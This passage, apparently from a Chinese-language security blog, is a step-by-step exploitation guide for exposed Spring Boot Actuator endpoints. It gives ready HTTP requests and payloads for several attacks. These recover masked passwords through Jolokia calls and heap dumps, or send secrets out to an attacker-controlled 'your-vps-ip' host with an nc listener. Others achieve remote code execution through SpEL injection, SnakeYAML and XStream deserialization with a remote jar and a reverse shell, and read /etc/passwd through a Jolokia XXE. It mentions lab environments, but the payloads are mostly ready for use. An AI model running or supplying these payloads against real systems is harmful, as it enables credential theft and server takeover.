/jolokiaContent-Type: application/json&#123;"mbean": "org.springframework.boot:name=SpringApplication,type=Admin","operation": "getProperty", "type": "EXEC", "arguments": ["security.user.password"]&#125;</code></pre><p>spring 2.x</p><pre class="language-markup" data-language="markup"><code class="language-markup">POST /actuator/jolokiaContent-Type: application/json&#123;"mbean": "org.springframework.boot:name=SpringApplication,type=Admin","operation": "getProperty", "type": "EXEC", "arguments": ["security.user.password"]&#125;</code></pre><ul><li>调用 <code>org.springframework.cloud.context.environment</code> Mbean</li></ul><blockquote><p>实际上是调用 org.springframework.cloud.context.environment.EnvironmentManager 类实例的 getProperty 方法</p></blockquote><p>spring 1.x</p><pre class="language-markup" data-language="markup"><code class="language-markup">POST /jolokiaContent-Type: application/json&#123;"mbean": "org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager","operation": "getProperty", "type": "EXEC", "arguments": ["security.user.password"]&#125;</code></pre><p>spring 2.x</p><pre class="language-markup" data-language="markup"><code class="language-markup">POST /actuator/jolokiaContent-Type: application/json&#123;"mbean": "org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager","operation": "getProperty", "type": "EXEC", "arguments": ["security.user.password"]&#125;</code></pre><ul><li>调用其他 Mbean</li></ul><blockquote><p>目标具体情况和存在的 Mbean 可能不一样，可以搜索 getProperty 等关键词，寻找可以调用的方法。</p></blockquote><h3 id="0x04：获取被星号脱敏的密码的明文-方法二"><a href="#0x04：获取被星号脱敏的密码的明文-方法二" class="headerlink" title="0x04：获取被星号脱敏的密码的明文 (方法二)"></a>0x04：获取被星号脱敏的密码的明文 (方法二)</h3><h4 id="利用条件：-1"><a href="#利用条件：-1" class="headerlink" title="利用条件："></a>利用条件：</h4><ul><li>可以 GET 请求目标网站的 <code>/env</code> </li><li>可以 POST 请求目标网站的 <code>/env</code> </li><li>可以 POST 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在 <code>spring-boot-starter-actuator</code> 依赖）</li><li>目标使用了 <code>spring-cloud-starter-netflix-eureka-client</code> 依赖</li><li>目标可以请求攻击者的服务器（请求可出外网）</li></ul><h4 id="利用方法：-1"><a href="#利用方法：-1" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：-找到想要获取的属性名-1"><a href="#步骤一：-找到想要获取的属性名-1" class="headerlink" title="步骤一： 找到想要获取的属性名"></a>步骤一： 找到想要获取的属性名</h5><p>GET 请求目标网站的 <code>/env</code> 或 <code>/actuator/env</code> 接口，搜索 <code>******</code> 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。</p><h5 id="步骤二：-使用-nc-监听-HTTP-请求"><a href="#步骤二：-使用-nc-监听-HTTP-请求" class="headerlink" title="步骤二： 使用 nc 监听 HTTP 请求"></a>步骤二： 使用 nc 监听 HTTP 请求</h5><p>在自己控制的外网服务器上监听 80 端口：</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> <span class="token parameter variable">-lvk</span> <span class="token number">80</span></code></pre><h5 id="步骤三：-设置-eureka-client-serviceUrl-defaultZone-属性"><a href="#步骤三：-设置-eureka-client-serviceUrl-defaultZone-属性" class="headerlink" title="步骤三： 设置 eureka.client.serviceUrl.defaultZone 属性"></a>步骤三： 设置 eureka.client.serviceUrl.defaultZone 属性</h5><p>将下面 <code>http://value:$&#123;security.user.password&#125;@your-vps-ip</code>  中的  <code>security.user.password</code> 换成自己想要获取的对应的星号 * 遮掩的属性名；</p><p><code>your-vps-ip</code> 换成自己外网服务器的真实 ip 地址。</p><p>spring 1.x</p><pre class="language-markup" data-language="markup"><code class="language-markup">POST /envContent-Type: application/x-www-form-urlencodedeureka.client.serviceUrl.defaultZone=http://value:$&#123;security.user.password&#125;@your-vps-ip</code></pre><p>spring 2.x</p><pre class="language-markup" data-language="markup"><code class="language-markup">POST /actuator/envContent-Type: application/json&#123;"name":"eureka.client.serviceUrl.defaultZone","value":"http://value:$&#123;security.user.password&#125;@your-vps-ip"&#125;</code></pre><h5 id="步骤四：-刷新配置"><a href="#步骤四：-刷新配置" class="headerlink" title="步骤四： 刷新配置"></a>步骤四： 刷新配置</h5><p>spring 1.x</p><pre class="language-markup" data-language="markup"><code class="language-markup">POST /refreshContent-Type: application/x-www-form-urlencoded</code></pre><p>spring 2.x</p><pre class="language-markup" data-language="markup"><code class="language-markup">POST /actuator/refreshContent-Type: application/json</code></pre><h5 id="步骤五：-解码属性值"><a href="#步骤五：-解码属性值" class="headerlink" title="步骤五： 解码属性值"></a>步骤五： 解码属性值</h5><p>正常的话，此时 nc 监听的服务器会收到目标发来的请求，其中包含类似如下 <code>Authorization</code> 头内容：</p><pre class="language-markup" data-language="markup"><code class="language-markup">Authorization: Basic dmFsdWU6MTIzNDU2</code></pre><p>将其中的 <code>dmFsdWU6MTIzNDU2</code>部分使用 base64 解码，即可获得类似明文值 <code>value:123456</code>，其中的 <code>123456</code> 即是目标星号 * 脱敏前的属性值明文。</p><h3 id="0x05：获取被星号脱敏的密码的明文-方法三"><a href="#0x05：获取被星号脱敏的密码的明文-方法三" class="headerlink" title="0x05：获取被星号脱敏的密码的明文 (方法三)"></a>0x05：获取被星号脱敏的密码的明文 (方法三)</h3><h4 id="利用条件：-2"><a href="#利用条件：-2" class="headerlink" title="利用条件："></a>利用条件：</h4><ul><li>通过 POST <code>/env</code> 设置属性触发目标对外网指定地址发起任意 http 请求</li><li>目标可以请求攻击者的服务器（请求可出外网）</li></ul><h4 id="利用方法：-2"><a href="#利用方法：-2" class="headerlink" title="利用方法："></a>利用方法：</h4><blockquote><p>参考 UUUUnotfound 提出的 <a href="https://github.com/LandGrey/SpringBootVulExploit/issues/1">issue-1</a>，可以在目标发外部 http 请求的过程中，在 url path 中利用占位符带出数据</p></blockquote><h5 id="步骤一：-找到想要获取的属性名-2"><a href="#步骤一：-找到想要获取的属性名-2" class="headerlink" title="步骤一： 找到想要获取的属性名"></a>步骤一： 找到想要获取的属性名</h5><p>GET 请求目标网站的 <code>/env</code> 或 <code>/actuator/env</code> 接口，搜索 <code>******</code> 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。</p><h5 id="步骤二：-使用-nc-监听-HTTP-请求-1"><a href="#步骤二：-使用-nc-监听-HTTP-请求-1" class="headerlink" title="步骤二： 使用 nc 监听 HTTP 请求"></a>步骤二： 使用 nc 监听 HTTP 请求</h5><p>在自己控制的外网服务器上监听 80 端口：</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> <span class="token parameter variable">-lvk</span> <span class="token number">80</span></code></pre><h5 id="步骤三：-触发对外-http-请求"><a href="#步骤三：-触发对外-http-请求" class="headerlink" title="步骤三： 触发对外 http 请求"></a>步骤三： 触发对外 http 请求</h5><ul><li><code>spring.cloud.bootstrap.location</code> 方法（<strong>同时适用于</strong>明文数据中有特殊 url 字符的情况）</li></ul><p>spring 1.x</p><pre class="language-markup" data-language="markup"><code class="language-markup">POST /envContent-Type: application/x-www-form-urlencodedspring.cloud.bootstrap.location=http://your-vps-ip/?=$&#123;security.user.password&#125;</code></pre><p>spring 2.x</p><pre class="language-markup" data-language="markup"><code class="language-markup">POST /actuator/envContent-Type: application/json&#123;"name":"spring.cloud.bootstrap.location","value":"http://your-vps-ip/?=$&#123;security.user.password&#125;"&#125;</code></pre><ul><li><code>eureka.client.serviceUrl.defaultZone</code> 方法（<strong>不适用于</strong>明文数据中有特殊 url 字符的情况）</li></ul><p>spring 1.x</p><pre class="language-markup" data-language="markup"><code class="language-markup">POST /envContent-Type: application/x-www-form-urlencodedeureka.client.serviceUrl.defaultZone=http://your-vps-ip/$&#123;security.user.password&#125;</code></pre><p>spring 2.x</p><pre class="language-markup" data-language="markup"><code class="language-markup">POST /actuator/envContent-Type: application/json&#123;"name":"eureka.client.serviceUrl.defaultZone","value":"http://your-vps-ip/$&#123;security.user.password&#125;"&#125;</code></pre><h5 id="步骤四：-刷新配置-1"><a href="#步骤四：-刷新配置-1" class="headerlink" title="步骤四： 刷新配置"></a>步骤四： 刷新配置</h5><p>spring 1.x</p><pre class="language-markup" data-language="markup"><code class="language-markup">POST /refreshContent-Type: application/x-www-form-urlencoded</code></pre><p>spring 2.x</p><pre class="language-markup" data-language="markup"><code class="language-markup">POST /actuator/refreshContent-Type: application/json</code></pre><h3 id="0x06：获取被星号脱敏的密码的明文-方法四"><a href="#0x06：获取被星号脱敏的密码的明文-方法四" class="headerlink" title="0x06：获取被星号脱敏的密码的明文 (方法四)"></a>0x06：获取被星号脱敏的密码的明文 (方法四)</h3><blockquote><p>访问 &#x2F;env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果</p></blockquote><h4 id="利用条件：-3"><a href="#利用条件：-3" class="headerlink" title="利用条件："></a>利用条件：</h4><ul><li>可正常 GET 请求目标 <code>/heapdump</code> 或 <code>/actuator/heapdump</code> 接口</li></ul><h4 id="利用方法：-3"><a href="#利用方法：-3" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：-找到想要获取的属性名-3"><a href="#步骤一：-找到想要获取的属性名-3" class="headerlink" title="步骤一： 找到想要获取的属性名"></a>步骤一： 找到想要获取的属性名</h5><p>GET 请求目标网站的 <code>/env</code> 或 <code>/actuator/env</code> 接口，搜索 <code>******</code> 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。</p><h5 id="步骤二：-下载-jvm-heap-信息"><a href="#步骤二：-下载-jvm-heap-信息" class="headerlink" title="步骤二： 下载 jvm heap 信息"></a>步骤二： 下载 jvm heap 信息</h5><blockquote><p>下载的 heapdump 文件大小通常在 50M—500M 之间，有时候也可能会大于 2G</p></blockquote><p><code>GET</code> 请求目标的 <code>/heapdump</code> 或 <code>/actuator/heapdump</code> 接口，下载应用实时的 JVM 堆信息</p><h5 id="步骤三：-使用-MAT-获得-jvm-heap-中的密码明文"><a href="#步骤三：-使用-MAT-获得-jvm-heap-中的密码明文" class="headerlink" title="步骤三： 使用 MAT 获得 jvm heap 中的密码明文"></a>步骤三： 使用 MAT 获得 jvm heap 中的密码明文</h5><p>参考 <a href="https://landgrey.me/blog/16/">文章</a> 方法，使用 <a href="https://www.eclipse.org/mat/downloads.php">Eclipse Memory Analyzer</a> 工具的 <strong>OQL</strong> 语句 </p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Hashtable$Entry x <span class="token keyword">WHERE</span> <span class="token punctuation">(</span>toString<span class="token punctuation">(</span>x<span class="token punctuation">.</span><span class="token keyword">key</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">contains</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>或<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>LinkedHashMap$Entry x <span class="token keyword">WHERE</span> <span class="token punctuation">(</span>toString<span class="token punctuation">(</span>x<span class="token punctuation">.</span><span class="token keyword">key</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">contains</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>辅助用 “<strong>password</strong>“ 等关键词快速过滤分析，获得密码等相关敏感信息的明文。</p><h2 id="二：远程代码执行"><a href="#二：远程代码执行" class="headerlink" title="二：远程代码执行"></a>二：远程代码执行</h2><blockquote><p>由于 spring boot 相关漏洞可能是多个组件漏洞组合导致的，所以有些漏洞名字起的不太正规，以能区分为准</p></blockquote><h3 id="0x01：whitelabel-error-page-SpEL-RCE"><a href="#0x01：whitelabel-error-page-SpEL-RCE" class="headerlink" title="0x01：whitelabel error page SpEL RCE"></a>0x01：whitelabel error page SpEL RCE</h3><h4 id="利用条件：-4"><a href="#利用条件：-4" class="headerlink" title="利用条件："></a>利用条件：</h4><ul><li>spring boot 1.1.0-1.1.12、1.2.0-1.2.7、1.3.0</li><li>至少知道一个触发 springboot 默认错误页面的接口及参数名</li></ul><h4 id="利用方法：-4"><a href="#利用方法：-4" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：找到一个正常传参处"><a href="#步骤一：找到一个正常传参处" class="headerlink" title="步骤一：找到一个正常传参处"></a>步骤一：找到一个正常传参处</h5><p>比如发现访问  <code>/article?id=xxx</code> ，页面会报状态码为 500 的错误： <code>Whitelabel Error Page</code>，则后续 payload 都将会在参数 id 处尝试。</p><h5 id="步骤二：执行-SpEL-表达式"><a href="#步骤二：执行-SpEL-表达式" class="headerlink" title="步骤二：执行 SpEL 表达式"></a>步骤二：执行 SpEL 表达式</h5><p>输入 <code>/article?id=$&#123;7*7&#125;</code> ，如果发现报错页面将 7*7 的值 49 计算出来显示在报错页面上，那么基本可以确定目标存在 SpEL 表达式注入漏洞。</p><p>由字符串格式转换成 <code>0x**</code> java 字节形式，方便执行任意代码：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># coding: utf-8</span>result <span class="token operator">=</span> <span class="token string">""</span>target <span class="token operator">=</span> <span class="token string">'open -a Calculator'</span><span class="token keyword">for</span> x <span class="token keyword">in</span> target<span class="token punctuation">:</span>    result <span class="token operator">+=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">","</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>执行 <code>open -a Calculator</code> 命令</p><pre class="language-java" data-language="java"><code class="language-java">$<span class="token punctuation">&#123;</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token number">0x6f</span><span class="token punctuation">,</span><span class="token number">0x70</span><span class="token punctuation">,</span><span class="token number">0x65</span><span class="token punctuation">,</span><span class="token number">0x6e</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0x2d</span><span class="token punctuation">,</span><span class="token number">0x61</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0x43</span><span class="token punctuation">,</span><span class="token number">0x61</span><span class="token punctuation">,</span><span class="token number">0x6c</span><span class="token punctuation">,</span><span class="token number">0x63</span><span class="token punctuation">,</span><span class="token number">0x75</span><span class="token punctuation">,</span><span class="token number">0x6c</span><span class="token punctuation">,</span><span class="token number">0x61</span><span class="token punctuation">,</span><span class="token number">0x74</span><span class="token punctuation">,</span><span class="token number">0x6f</span><span class="token punctuation">,</span><span class="token number">0x72</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></code></pre><h4 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><ol><li>spring boot 处理参数值出错，流程进入 <code>org.springframework.util.PropertyPlaceholderHelper</code> 类中</li><li>此时 URL 中的参数值会用 <code>parseStringValue</code> 方法进行递归解析</li><li>其中  <code>$&#123;&#125;</code>  包围的内容都会被 <code>org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration</code> 类的 <code>resolvePlaceholder</code> 方法当作 SpEL 表达式被解析执行，造成 RCE 漏洞</li></ol><h4 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><p>​<a href="https://www.cnblogs.com/litlife/p/10183137.html">SpringBoot SpEL表达式注入漏洞-分析与复现</a></p><h4 id="漏洞环境："><a href="#漏洞环境：" class="headerlink" title="漏洞环境："></a>漏洞环境：</h4><p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-spel-rce">repository&#x2F;springboot-spel-rce</a></p><p>正常访问：</p><pre class="language-markup" data-language="markup"><code class="language-markup">http://127.0.0.1:9091/article?id=66</code></pre><p>执行 <code>open -a Calculator</code> 命令：</p><pre class="language-java" data-language="java"><code class="language-java">http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token operator">:</span><span class="token number">9091</span><span class="token operator">/</span>article<span class="token operator">?</span>id<span class="token operator">=</span>$<span class="token punctuation">&#123;</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token keyword">new</span><span class="token operator">%</span><span class="token function">20String</span><span class="token punctuation">(</span><span class="token keyword">new</span><span class="token operator">%</span><span class="token number">20</span>byte<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token number">0x6f</span><span class="token punctuation">,</span><span class="token number">0x70</span><span class="token punctuation">,</span><span class="token number">0x65</span><span class="token punctuation">,</span><span class="token number">0x6e</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0x2d</span><span class="token punctuation">,</span><span class="token number">0x61</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0x43</span><span class="token punctuation">,</span><span class="token number">0x61</span><span class="token punctuation">,</span><span class="token number">0x6c</span><span class="token punctuation">,</span><span class="token number">0x63</span><span class="token punctuation">,</span><span class="token number">0x75</span><span class="token punctuation">,</span><span class="token number">0x6c</span><span class="token punctuation">,</span><span class="token number">0x61</span><span class="token punctuation">,</span><span class="token number">0x74</span><span class="token punctuation">,</span><span class="token number">0x6f</span><span class="token punctuation">,</span><span class="token number">0x72</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></code></pre><h3 id="0x02：spring-cloud-SnakeYAML-RCE"><a href="#0x02：spring-cloud-SnakeYAML-RCE" class="headerlink" title="0x02：spring cloud SnakeYAML RCE"></a>0x02：spring cloud SnakeYAML RCE</h3><h4 id="利用条件：-5"><a href="#利用条件：-5" class="headerlink" title="利用条件："></a>利用条件：</h4><ul><li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li><li>可以 POST 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在 <code>spring-boot-starter-actuator</code> 依赖）</li><li>目标依赖的 <code>spring-cloud-starter</code> 版本 &lt; 1.3.0.RELEASE</li><li>目标可以请求攻击者的 HTTP 服务器（请求可出外网）</li></ul><h4 id="利用方法：-5"><a href="#利用方法：-5" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：-托管-yml-和-jar-文件"><a href="#步骤一：-托管-yml-和-jar-文件" class="headerlink" title="步骤一： 托管 yml 和 jar 文件"></a>步骤一： 托管 yml 和 jar 文件</h5><p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 使用 python 快速开启 http server</span>python2 <span class="token parameter variable">-m</span> SimpleHTTPServer <span class="token number">80</span>python3 <span class="token parameter variable">-m</span> http.server <span class="token number">80</span></code></pre><p>在网站根目录下放置后缀为 <code>yml</code> 的文件  <code>example.yml</code>，内容如下：</p><pre class="language-yaml" data-language="yaml"><code class="language-yaml"><span class="token tag">!!javax.script.ScriptEngineManager</span> <span class="token punctuation">[</span>  <span class="token tag">!!java.net.URLClassLoader</span> <span class="token punctuation">[</span><span class="token punctuation">[</span>    <span class="token tag">!!java.net.URL</span> <span class="token punctuation">[</span><span class="token string">"http://your-vps-ip/example.jar"</span><span class="token punctuation">]</span>  <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span></code></pre><p>在网站根目录下放置后缀为 <code>jar</code> 的文件  <code>example.jar</code>，内容是要执行的代码，代码编写及编译方式参考 <a href="https://github.com/artsploit/yaml-payload">yaml-payload</a>。</p><h5 id="步骤二：-设置-spring-cloud-bootstrap-location-属性"><a href="#步骤二：-设置-spring-cloud-bootstrap-location-属性" class="headerlink" title="步骤二： 设置 spring.cloud.bootstrap.location 属性"></a>步骤二： 设置 spring.cloud.bootstrap.location 属性</h5><p>spring 1.x</p><pre class="language-markup" data-language="markup"><code class="language-markup">POST /envContent-Type: application/x-www-form-urlencodedspring.cloud.bootstrap.location=http://your-vps-ip/example.yml</code></pre><p>spring 2.x</p><pre class="language-markup" data-language="markup"><code class="language-markup">POST /actuator/envContent-Type: application/json&#123;"name":"spring.cloud.bootstrap.location","value":"http://your-vps-ip/example.yml"&#125;</code></pre><h5 id="步骤三：-刷新配置"><a href="#步骤三：-刷新配置" class="headerlink" title="步骤三： 刷新配置"></a>步骤三： 刷新配置</h5><p>spring 1.x</p><pre class="language-markup" data-language="markup"><code class="language-markup">POST /refreshContent-Type: application/x-www-form-urlencoded</code></pre><p>spring 2.x</p><pre class="language-markup" data-language="markup"><code class="language-markup">POST /actuator/refreshContent-Type: application/json</code></pre><h4 id="漏洞原理：-1"><a href="#漏洞原理：-1" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><ol><li>spring.cloud.bootstrap.location 属性被设置为外部恶意 yml 文件 URL 地址</li><li>refresh 触发目标机器请求远程 HTTP 服务器上的 yml 文件，获得其内容</li><li>SnakeYAML 由于存在反序列化漏洞，所以解析恶意 yml 内容时会完成指定的动作</li><li>先是触发 java.net.URL 去拉取远程 HTTP 服务器上的恶意 jar 文件</li><li>然后是寻找 jar 文件中实现 javax.script.ScriptEngineFactory 接口的类并实例化</li><li>实例化类时执行恶意代码，造成 RCE 漏洞</li></ol><h4 id="漏洞分析：-1"><a href="#漏洞分析：-1" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><p>​<a href="https://b1ngz.github.io/exploit-spring-boot-actuator-spring-cloud-env-note/">Exploit Spring Boot Actuator 之 Spring Cloud Env 学习笔记</a></p><h4 id="漏洞环境：-1"><a href="#漏洞环境：-1" class="headerlink" title="漏洞环境："></a>漏洞环境：</h4><p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springcloud-snakeyaml-rce">repository&#x2F;springcloud-snakeyaml-rce</a></p><p>正常访问：</p><pre class="language-markup" data-language="markup"><code class="language-markup">http://127.0.0.1:9092/env</code></pre><h3 id="0x03：eureka-xstream-deserialization-RCE"><a href="#0x03：eureka-xstream-deserialization-RCE" class="headerlink" title="0x03：eureka xstream deserialization RCE"></a>0x03：eureka xstream deserialization RCE</h3><h4 id="利用条件：-6"><a href="#利用条件：-6" class="headerlink" title="利用条件："></a>利用条件：</h4><ul><li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li><li>可以 POST 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在 <code>spring-boot-starter-actuator</code> 依赖）</li><li>目标使用的  <code>eureka-client</code> &lt; 1.8.7（通常包含在 <code>spring-cloud-starter-netflix-eureka-client</code> 依赖中）</li><li>目标可以请求攻击者的 HTTP 服务器（请求可出外网）</li></ul><h4 id="利用方法：-6"><a href="#利用方法：-6" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：架设响应恶意-XStream-payload-的网站"><a href="#步骤一：架设响应恶意-XStream-payload-的网站" class="headerlink" title="步骤一：架设响应恶意 XStream payload 的网站"></a>步骤一：架设响应恶意 XStream payload 的网站</h5><p>提供一个依赖 Flask 并符合要求的 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-xstream-rce.py">python 脚本示例</a>，作用是利用目标 Linux 机器上自带的 python 来反弹shell。</p><p>使用 python 在自己控制的服务器上运行以上的脚本，并根据实际情况修改脚本中反弹 shell 的 ip 地址和 端口号。</p><h5 id="步骤二：监听反弹-shell-的端口"><a href="#步骤二：监听反弹-shell-的端口" class="headerlink" title="步骤二：监听反弹 shell 的端口"></a>步骤二：监听反弹 shell 的端口</h5><p>一般使用 nc 监听端口，等待反弹 shell</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> <span class="token parameter variable">-lvp</span> <span class="token number">443</span></code></pre><h5 id="步骤三：设置-eureka-client-serviceUrl-defaultZone-属性"><a href="#步骤三：设置-eureka-client-serviceUrl-defaultZone-属性" class="headerlink" title="步骤三：设置 eureka.client.serviceUrl.defaultZone 属性"></a>步骤三：设置 eureka.client.serviceUrl.defaultZone 属性</h5><p>spring 1.x</p><pre class="language-markup" data-language="markup"><code class="language-markup">POST /envContent-Type: application/x-www-form-urlencodedeureka.client.serviceUrl.defaultZone=http://your-vps-ip/example</code></pre><p>spring 2.x</p><pre class="language-markup" data-language="markup"><code class="language-markup">POST /actuator/envContent-Type: application/json&#123;"name":"eureka.client.serviceUrl.defaultZone","value":"http://your-vps-ip/example"&#125;</code></pre><h5 id="步骤四：刷新配置"><a href="#步骤四：刷新配置" class="headerlink" title="步骤四：刷新配置"></a>步骤四：刷新配置</h5><p>spring 1.x</p><pre class="language-markup" data-language="markup"><code class="language-markup">POST /refreshContent-Type: application/x-www-form-urlencoded</code></pre><p>spring 2.x</p><pre class="language-markup" data-language="markup"><code class="language-markup">POST /actuator/refreshContent-Type: application/json</code></pre><h4 id="漏洞原理：-2"><a href="#漏洞原理：-2" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><ol><li>eureka.client.serviceUrl.defaultZone 属性被设置为恶意的外部 eureka server URL 地址</li><li>refresh 触发目标机器请求远程 URL，提前架设的 fake eureka server 就会返回恶意的 payload</li><li>目标机器相关依赖解析 payload，触发 XStream 反序列化，造成 RCE 漏洞</li></ol><h4 id="漏洞分析：-2"><a href="#漏洞分析：-2" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><p>​<a href="https://www.freebuf.com/column/234719.html">Spring Boot Actuator从未授权访问到getshell</a></p><h4 id="漏洞环境：-2"><a href="#漏洞环境：-2" class="headerlink" title="漏洞环境："></a>漏洞环境：</h4><p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-eureka-xstream-rce">repository&#x2F;springboot-eureka-xstream-rce</a></p><p>正常访问：</p><pre class="language-markup" data-language="markup"><code class="language-markup">http://127.0.0.1:9093/env</code></pre><h3 id="0x04-jolokia-XXE"><a href="#0x04-jolokia-XXE" class="headerlink" title="0x04: jolokia XXE"></a>0x04: jolokia XXE</h3><h4 id="利用条件：-7"><a href="#利用条件：-7" class="headerlink" title="利用条件："></a>利用条件：</h4><ul><li>目标网站存在 <code>/jolokia/list</code> 或 <code>/actuator/jolokia/list</code> 接口</li><li>目标使用了 <code>jolokia-core</code> 依赖（版本要求暂未知）并且环境中存在相关 MBean,且<code>logback</code>库提供<code>reloadByURL</code>方法</li><li>目标可以请求攻击者的 HTTP 服务器（请求可出外网）</li></ul><h4 id="利用方法：-7"><a href="#利用方法：-7" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：查看已存在的-MBeans"><a href="#步骤一：查看已存在的-MBeans" class="headerlink" title="步骤一：查看已存在的 MBeans"></a>步骤一：查看已存在的 MBeans</h5><p>访问 <code>/jolokia/list</code> 接口，查看是否存在 <code>ch.qos.logback.classic.jmx.JMXConfigurator</code> 和 <code>reloadByURL</code> 关键词。</p><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210604153514.png" alt="20210604153514"></p><h5 id="步骤二：托管logback-xml和fileread-dtd文件"><a href="#步骤二：托管logback-xml和fileread-dtd文件" class="headerlink" title="步骤二：托管logback.xml和fileread.dtd文件"></a>步骤二：托管logback.xml和fileread.dtd文件</h5><p>在你自己的VPS上创建<code>logback.xml</code>和<code>fileread.dtd</code>文件，文件内容如下：<br>logback.xml</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8" ?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">a</span> <span class="token punctuation">[</span><span class="token internal-subset"> &lt;!ENTITY % remote SYSTEM "http://x.x.x.x/fileread.dtd">%remote;%int;</span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&trick;">&amp;trick;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></code></pre><p>fileread.dtd</p><pre class="language-markup" data-language="markup"><code class="language-markup">&lt;!ENTITY % d SYSTEM "file:///etc/passwd"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">%</span> <span class="token attr-name">int</span> <span class="token attr-name">"&lt;!ENTITY</span> <span class="token attr-name">trick</span> <span class="token attr-name">SYSTEM</span> <span class="token attr-name"><span class="token namespace">':</span>%d;'</span><span class="token punctuation">></span></span>"></code></pre><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210604153557.png" alt="20210604153557"></p><h5 